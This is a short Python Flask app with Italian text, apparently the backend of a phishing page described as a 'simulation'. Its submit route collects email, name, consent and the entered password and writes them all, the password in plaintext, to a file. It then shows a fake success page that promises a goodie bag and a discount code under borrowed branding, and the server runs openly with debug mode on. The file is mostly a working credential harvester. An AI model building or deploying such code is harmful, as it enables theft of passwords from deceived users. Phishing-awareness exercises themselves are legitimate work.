from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

@app.route("/")
def home():
    return render_template("esnPage.html")


@app.route("/submit", methods=["POST"])
def submit():
    email = request.form.get("email")
    nome = request.form.get("nome")
    consenso = request.form.get("consenso")
    password_inserita = request.form.get("password")

    with open("dati.txt", "a") as f:
        f.write(
            f"Email: {email} | "
            f"Nome: {nome} | "
            f"Consenso: {consenso} | "
            f"Password inserita: {password_inserita}\n"
        )

    print("\n=== DATI RICEVUTI NELLA SIMULAZIONE ===")
    print("Email:", email)
    print("Nome:", nome)
    print("Consenso:", consenso)
    print("Password inserita:", "SI" if password_inserita else "NO")

    return redirect(url_for("success"))


@app.route("/success")
def success():
    return """
    <!DOCTYPE html>
    <html lang="it">
    <head>
        <meta charset="UTF-8">
        <title>Conferma</title>
    </head>
    <body style="background:black;color:white;text-align:center;font-family:Arial;margin-top:120px;">
        <img src="https://d3k81ch9hvuctc.cloudfront.net/company/RXHQa6/images/e95da67b-21b0-49e3-a51d-ab0fe78d05b5.png" width="130">
        <h1>Ci siamo! ✅</h1>
        <p><strong>Puoi ritirare la tua goodie bag.</strong></p>
        <p>Il tuo codice sconto del 20% per il tuo primo ordine ti verrà inviato via email a breve.</p>
    </body>
    </html>
    """


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
